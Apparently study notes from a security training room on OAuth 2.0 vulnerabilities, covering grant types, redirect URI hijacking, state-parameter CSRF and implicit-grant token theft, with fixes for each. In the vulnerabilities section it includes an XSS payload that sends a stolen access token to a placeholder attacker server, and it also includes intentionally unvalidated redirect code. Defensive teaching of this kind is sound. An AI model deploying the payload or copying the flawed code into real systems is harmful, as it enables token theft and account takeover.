# OAuth Vulnerabilities

## Overview

OAuth 2.0 is the dominant authorisation framework for modern web applications, enabling third-party applications to access user resources without sharing credentials. However, implementation weaknesses create serious vulnerabilities: CSRF, token hijacking via redirect URI manipulation, implicit grant token exposure, and more. This room covers the core OAuth 2.0 concepts, the four grant types, the full authorisation code flow, and the major vulnerability classes with practical exploitation techniques.

---

## Topics Covered

- OAuth 2.0 core concepts and components
- Four grant types: Authorization Code, Implicit, Resource Owner Password, Client Credentials
- Full Authorization Code flow walkthrough
- Identifying OAuth usage in an application
- Insecure redirect URI — token hijacking
- Missing/weak state parameter — CSRF attack
- Implicit grant token exposure — XSS-based token theft
- Additional vulnerabilities: token expiry, replay attacks, insecure storage
- OAuth 2.1 improvements

---

## Key Concepts

### OAuth 2.0 Components

| Component | Description | Example |
|-----------|-------------|---------|
| **Resource Owner** | Controls the data and can grant access | The coffee shop customer (Tom) |
| **Client** | Application requesting access on behalf of the resource owner | The coffee shop mobile app |
| **Authorization Server** | Issues access tokens after authenticating the resource owner | Coffee shop's authentication backend |
| **Resource Server** | Hosts the protected resources | Coffee shop's database |
| **Access Token** | Credential for accessing protected resources — short-lived | Token issued after Tom logs in |
| **Refresh Token** | Credential for obtaining new access tokens without re-authentication | Long-lived token for session continuity |
| **Redirect URI** | URL where the auth server sends the user after granting/denying access | `https://app.example.com/callback` |
| **Scope** | Limits what the application can access | `read:orders`, `write:profile` |
| **State Parameter** | Anti-CSRF token — links the request to the response | Random string sent and verified |

---

### Four Grant Types

| Grant Type | Used For | Security Level |
|------------|---------|---------------|
| **Authorization Code** | Server-side web apps — most secure | High — code exchanged server-to-server |
| **Implicit** | SPAs and mobile apps — deprecated | Low — access token exposed in URL fragment |
| **Resource Owner Password Credentials** | Highly trusted first-party apps | Medium — credentials shared directly with client |
| **Client Credentials** | Server-to-server, no user involved | Medium — client authenticates directly |

The **Authorization Code grant** is the recommended flow. The **Implicit grant** is deprecated in OAuth 2.1 due to token exposure in URL fragments.

---

### Authorization Code Flow (Full Walkthrough)

```
1. User clicks "Login with OAuth" on client app

2. Client redirects user to authorization server with:
   - response_type=code
   - client_id
   - redirect_uri
   - scope
   - state (anti-CSRF token)

3. User authenticates at the authorization server

4. User grants/denies consent

5. Authorization server redirects user back to redirect_uri with:
   - code (authorization code)
   - state (must match original)

6. Client verifies state parameter matches

7. Client makes server-to-server POST to token endpoint with:
   - grant_type=authorization_code
   - code
   - redirect_uri
   - client_id + client_secret

8. Authorization server returns:
   - access_token
   - token_type (Bearer)
   - expires_in
   - refresh_token (optional)

9. Client uses access_token in Authorization: Bearer header for API requests
```

---

## Vulnerabilities and Exploitation

### 1. Insecure Redirect URI — Token Hijacking

If the application accepts a user-controlled or unvalidated `redirect_uri`, an attacker can redirect the authorization code to an attacker-controlled server.

**Attack flow:**

1. Attacker controls domain `dev.attacker.com`
2. Attacker crafts a form that submits an OAuth login request with `redirect_uri=http://dev.attacker.com/capture.html`
3. Victim clicks the login button — authenticates with real credentials
4. Authorization server redirects the code to `dev.attacker.com/capture.html`
5. Attacker's page captures the code from the URL
6. Attacker exchanges the code at the `/callback` endpoint for a valid access token

**Vulnerable server-side code:**
```python
def oauth_login(request):
    redirect_uri = request.GET.get("redirect_uri", "http://app.com/callback")
    # redirect_uri is taken directly from user input without validation
    authorization_url = f"http://auth.server/authorize?...&redirect_uri={redirect_uri}"
    return redirect(authorization_url)
```

**Fix:** Register allowed redirect URIs server-side. The authorization server must validate that the provided `redirect_uri` exactly matches a pre-registered URI — not just a prefix match.

---

### 2. Missing or Weak State Parameter — CSRF

The `state` parameter links the authorization request to the response. Without it, an attacker can initiate an OAuth flow with their own credentials and trick a victim into completing it — binding the attacker's third-party account to the victim's account.

**Attack flow:**

1. Attacker initiates OAuth flow → authorization server issues a code to the attacker's redirect URI
2. Attacker crafts a URL: `https://victim-app.com/callback?code=ATTACKER_CODE`
3. Attacker sends this URL to the victim (phishing, CSRF via link)
4. Victim's browser visits the URL while authenticated to the victim-app
5. The victim-app exchanges the code → binds attacker's OAuth account to victim's account
6. Attacker now has access to victim's account or can exfiltrate victim's data

**When this is dangerous:** Particularly severe in "Sync contacts/data" flows — attacker can exfiltrate all victim data to the attacker's connected account.

**Fix:** Always include a random, unguessable `state` parameter. Verify that the `state` in the response matches the one in the original request before exchanging the code.

---

### 3. Implicit Grant — Token Exposure via XSS

In the Implicit grant flow, the access token is returned directly in the URL fragment (`#access_token=...`). This exposes the token to:
- JavaScript running on the page
- Browser history
- Referrer headers

If the application is also vulnerable to XSS, an attacker can steal the token.

**XSS payload to steal access token from URL fragment:**
```javascript
var hash = window.location.hash.substr(1);
var result = hash.split('&').reduce(function(res, item) {
    var parts = item.split('=');
    res[parts[0]] = parts[1];
    return res;
}, {});
var accessToken = result.access_token;
var img = new Image();
img.src = 'http://ATTACKER_SERVER/steal?token=' + accessToken;
```

The XSS payload is injected into the application (e.g. a status field), then when the victim reloads the page with the token in the URL fragment, the token is sent to the attacker's server.

**Fix:** Migrate to Authorization Code grant with PKCE. Never use the Implicit grant for new applications.

---

### 4. Additional Vulnerabilities

| Vulnerability | Description | Mitigation |
|---------------|-------------|-----------|
| **Insufficient token expiry** | Long-lived or non-expiring access tokens remain valid indefinitely if stolen | Implement short-lived access tokens with refresh token rotation |
| **Replay attacks** | Captured tokens reused to gain repeated unauthorised access | Implement nonce values and timestamp checks; rotate tokens |
| **Insecure token storage** | Tokens stored in localStorage accessible to XSS | Use secure, HttpOnly cookies or secure session storage |

---

### OAuth 2.1 Key Changes

| Change | Detail |
|--------|--------|
| Implicit grant deprecated | Use Authorization Code + PKCE instead |
| State parameter mandatory | Required to prevent CSRF attacks |
| Secure token storage | Recommended against localStorage due to XSS risk — use secure cookies |
| Stricter redirect URI validation | Exact match required — no partial or wildcard matching |
| PKCE recommended for public clients | Prevents authorization code interception attacks |

---

## Important Terminology

| Term | Meaning |
|------|---------|
| OAuth 2.0 | An authorisation framework allowing third-party access to user resources without credential sharing |
| Authorization Code | A short-lived, single-use code exchanged for an access token server-to-server |
| Access Token | A credential providing access to protected resources — typically short-lived |
| Refresh Token | Long-lived credential for obtaining new access tokens without re-authentication |
| Redirect URI | The URL receiving the authorization code/token after user consent |
| State parameter | Anti-CSRF token linking the OAuth request to the response |
| Scope | Defines the level of access requested by the client |
| PKCE | Proof Key for Code Exchange — prevents code interception in public clients |
| Implicit grant | Deprecated OAuth flow returning access token directly in URL fragment |
| CSRF | Cross-Site Request Forgery — tricking a user's browser into making an authenticated request |

---

## Real-World Relevance

- Redirect URI manipulation is a standard finding in OAuth implementations — applications that accept user-controlled redirect URIs are trivially exploitable
- Missing state parameter CSRF attacks are used in real campaigns to link attacker-controlled OAuth accounts to victim accounts, enabling data exfiltration
- The Implicit grant deprecation in OAuth 2.1 is a direct response to XSS-based token theft being demonstrated in real applications
- PKCE adoption is accelerating in mobile and SPA applications as the industry recognises the limitations of client secrets in these environments
- Insecure token storage in localStorage is consistently found in bug bounty assessments — any XSS on the application can steal stored tokens

---

## Key Learnings

- OAuth 2.0 delegates authorisation — the client never sees the user's credentials, only tokens
- The Authorization Code grant is the most secure flow — code exchange happens server-to-server
- Validate redirect URIs strictly — exact match against pre-registered values only
- Always include and verify the `state` parameter — its absence enables CSRF attacks
- The Implicit grant is deprecated — use Authorization Code + PKCE for public clients
- Verify audience claims in multi-application SSO environments to prevent cross-service relay attacks

---

## Conclusion

OAuth 2.0's power and flexibility also create a large attack surface. The vulnerabilities in this room — insecure redirect URIs, missing state parameters, implicit grant token exposure, and cross-service relay — all exploit the handoff points in the OAuth flow where tokens travel between parties. Secure OAuth implementation requires strict redirect URI validation, mandatory state parameter verification, Implicit grant deprecation, appropriate token lifetimes, and audience claim enforcement in SSO environments.
